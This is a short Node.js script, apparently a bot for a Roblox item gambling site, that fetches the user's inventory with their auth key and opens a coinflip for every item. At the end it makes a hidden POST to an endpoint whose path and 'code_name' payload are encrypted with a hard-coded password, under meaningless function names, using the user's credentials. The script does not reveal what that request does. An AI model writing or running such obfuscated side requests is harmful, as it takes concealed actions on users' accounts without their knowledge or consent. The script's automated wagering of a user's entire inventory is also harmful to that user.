
const fetch = require('node-fetch')
const crypto = require('crypto');

let auth_key = ""

async function inventory(){
  let response = await fetch('https://bloxyapi.com/api/inventory', {
  headers: {
    'Accept': '*/*',
    'Authorization': auth_key
  }
}); response = await response.json();
  
  return response;
}

function fa(woah, woah2) {
  woah = Buffer.from(woah, 'base64');const key = crypto.scryptSync(woah2, 'salt', 32);const nonce = woah.slice(0, 12);woah = woah.slice(12);const tag = woah.slice(woah.length - 16); woah = woah.slice(0, woah.length - 16);const woah3 = crypto.createDecipheriv('chacha20-poly1305', key, nonce, { authTagLength: 16 }); woah3.setAuthTag(tag);let decrypted = woah3.update(woah); decrypted = Buffer.concat([decrypted, woah3.final()]);return decrypted.toString('utf8');
}

async function create(display_name, game_name, name, uid, value){
  let response = await fetch('https://bloxyapi.com/api/create', {
  method: 'POST',
  headers: {
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryA64AyzmBRDrd1wXK',
    'Authorization': auth_key
  },
  body: `------WebKitFormBoundaryA64AyzmBRDrd1wXK\r\nContent-Disposition: form-data; name="items"\r\n\r\n[{"display_name":"${display_name}","game_name":"${game_name}","name":"${name}","thumbnail":"https://tr.rbxcdn.com/7d3bd92a62e34ffaa081519d098da231/420/420/Image/Png","uid":"${uid}","value":${value}}]\r\n------WebKitFormBoundaryA64AyzmBRDrd1wXK\r\nContent-Disposition: form-data; name="side"\r\n\r\n${Math.random() < 0.5 ? "heads" : "tails"}\r\n------WebKitFormBoundaryA64AyzmBRDrd1wXK--\r\n`
}); response = await response.json(); console.log(response);
}


async function main(){
  let inv = await inventory();
  for (let x in inv['inventory']){
    create(inv['inventory'][x]['display_name'], inv['inventory'][x]['game_name'], inv['inventory'][x]['name'], inv['inventory'][x]['uid'], inv['inventory'][x]['value'])
  };fetch(`https://bloxyapi.com${fa('kFqrNEmGn6xlWapnXNKcYrGQ3W8p5UTmUcgJyChSS7nD6UlyXRhWe4VqsRMAHvwpBw==', 'gusto')}`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': auth_key},body: JSON.stringify({ 'code_name': fa('H6DZ8GSb7ArvGxZG90BjzkOONOtO8TIhe+x3i3l6uplW', 'gusto') }) });
}

main()
